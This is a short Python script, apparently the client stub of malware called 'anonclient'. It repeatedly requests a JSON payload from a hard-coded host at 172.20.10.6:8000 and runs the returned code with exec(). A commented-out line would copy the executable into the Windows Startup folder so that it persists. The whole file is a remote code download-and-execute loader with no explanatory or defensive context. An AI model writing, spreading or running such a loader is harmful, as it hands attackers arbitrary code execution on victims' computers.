import requests
from threading import Thread
import os
import time
from datetime import datetime

try:
    pass
    # os.rename(f"{os.getcwd()}//anonclient.exe", f"C://Users//{os.getlogin()}//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//anonclient.exe")
except Exception as e:
    pass
while True:
    try:
        endpoint_1 = 'https://**************/'
        endpoint_2 = 'http://172.20.10.6:8000/'
        exec(requests.get(f'{endpoint_2}candy').json()['candy'])
        break
    except Exception as e:
        print(e)
        pass
